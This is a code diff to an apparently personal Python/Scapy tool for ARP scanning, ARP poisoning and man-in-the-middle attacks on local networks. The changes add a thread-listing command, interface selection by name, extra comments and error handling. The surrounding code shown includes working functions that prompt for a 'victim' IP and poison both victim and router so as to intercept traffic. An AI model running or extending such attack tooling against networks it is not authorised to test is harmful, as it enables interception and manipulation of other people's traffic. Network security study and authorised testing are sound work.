@@ -54,7 +54,9 @@ class ARPP(object):
             "select interface":self.select_interface,\
             "end an ARP poisoning process": self.end_ARP,\
             "end all ARP poisoning processes":self.end_all_threads,\
+            "show ARP poisoning processes":self.show_arp_poisoning_threads,\
             "arp mitm":self.ARP_MITM}
+        #self.TASK_DICT = collections.OrderedDict(sorted(self.TASK_DICT_temp.items())) #sorting ditcionary by keys
         self.THREADED_TASKS = []
         self.EVENTS = []
         self.system_os = platform.system() # returns either 'Windows' 'Linux' or 'Mac'
@@ -127,7 +129,7 @@ class ARPP(object):
             ip (str): A given IP address whose validity needs to be checked
 
         Returns:
-            bool : True if ip is a valid IP address
+            bool : True if IP is a valid IP address
         """
         try:
             return [0<=int(x)<256 for x in re.split('\.',re.match(r'^\d+\.\d+\.\d+\.\d+$',ip).group(0))].count(True)==4
@@ -171,7 +173,7 @@ class ARPP(object):
             answer = int(answer)
             if answer>=0 and answer<len(iflist):
                 self.SELECTED_INTERFACE=iflist[answer]
-                print("selected {}".format(self.SELECTED_INTERFACE))
+                print("[+] selected {}".format(self.SELECTED_INTERFACE))
             else:
                 print("[-] Interface does not exist\n")
         elif answer in iflist:
@@ -207,8 +209,13 @@ class ARPP(object):
                 #get_windows_if_list()[4]['name']
             else:
                 print("[-] Interface does not exist\n")
-        else:
-            print("[-] Interface does not exist\n")
+        elif not self._represents_int(answer):
+            ifs_names = [if_dict['name'] for if_dict in if_list]
+            if answer in ifs_names:
+                self.SELECTED_INTERFACE = IFACES.dev_from_name( answer )
+                print("[+] selected {}".format(answer))
+            else:
+                print("[-] Interface does not exist\n")
         
         
     def get_network_users_ARPSCAN(self):
@@ -217,16 +224,19 @@ class ARPP(object):
         """
         self._assure_interface_is_selected()
         
+        # create the packet
         ip_range = self.get_ip_range()
         request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range) #dst="ff:ff:..." means all devices on the network will receive this packet.
         print("[+] Finding devices connected to network, please wait...")
-        
         print("[+] Selected Interface: {}".format(self.SELECTED_INTERFACE))
-        network_devices = srp(request, timeout=10, verbose=1, iface=self.SELECTED_INTERFACE)[0] # sr is send receive command, srp for L2 packet, add 1 at the end for waiting for 1 packet only.
-        for i, user in enumerate(network_devices, start=0):
-            print("{}          {}".format(user[1].psrc, user[1].hwsrc))
         
-        if network_devices == []:
+        # doing srp(request) will return a tuple with results as first element and unanswered packets as second element
+        results = srp(request, timeout=10, verbose=1, iface=self.SELECTED_INTERFACE)[0] # sr is send receive command, srp for L2 packet, add 1 at the end for waiting for 1 packet only.
+        for i, req_and_reply in enumerate(results, start=0):
+            print("{}          {}".format(req_and_reply[1].psrc, req_and_reply[1].hwsrc)) #req_and_reply = [request packet, reply packet], we want to read the reply in this case
+        print()
+        
+        if results.res == []:
             print("[-] No network devices found\n")
         
     def ARP_poison(self, ipVictim = "", ipToSpoof = ""):
@@ -249,6 +259,8 @@ class ARPP(object):
                 ipVictim = str(input("ip of victim>>"))
             except SyntaxError:
                 pass
+            except KeyboardInterrupt:
+                break
         
         while not self._is_valid_ip(ipToSpoof):
             try:
@@ -256,8 +268,10 @@ class ARPP(object):
                 ipToSpoof = str(input("ip to spoof>>"))
             except SyntaxError:
                 pass
+            except KeyboardInterrupt:
+                break
         
-        macVictim = self._get_mac_from_ip(ipVictim) # fix bug where error given if ip is not online on network
+        macVictim = self._get_mac_from_ip(ipVictim)
         if macVictim is None:
             print("[-] Victims MAC address could not be found, victim is possibly no longer connected to network.")
             return
@@ -287,6 +301,8 @@ class ARPP(object):
         self.THREADED_TASKS[-1].start()
     
     def ARP_MITM(self):
+        """Method for performing a MITM attack using ARP poisoning
+        """
         ipVictim = ""
         ipRouter = ""
         while not self._is_valid_ip(ipVictim):
@@ -301,7 +317,13 @@ class ARPP(object):
                 pass
         self.ARP_poison(ipVictim=ipVictim, ipToSpoof=ipRouter)
         self.ARP_poison(ipVictim=ipRouter, ipToSpoof=ipVictim)
-        
+    
+    def show_arp_poisoning_threads(self):
+        alive_tasks_names = {}
+        for i,task in enumerate(self.THREADED_TASKS,start=0):
+            alive_tasks_names[i] = task.getName()
+            if task.is_alive():
+                print("{}: {}".format(i, task.getName()))
         
     def end_ARP(self):
         print("From the following threads select the processes to terminate:")
@@ -355,9 +377,6 @@ class ARPP(object):
             except KeyError:
                 print("[-] Command not found\n")
                 
-                #tb = traceback.format_exc()
-                #print(tb)
-                
 
     def CLI(self):
         try:
@@ -380,5 +399,3 @@ def main():
 
 if __name__=="__main__":
     main()
-
-sniff()
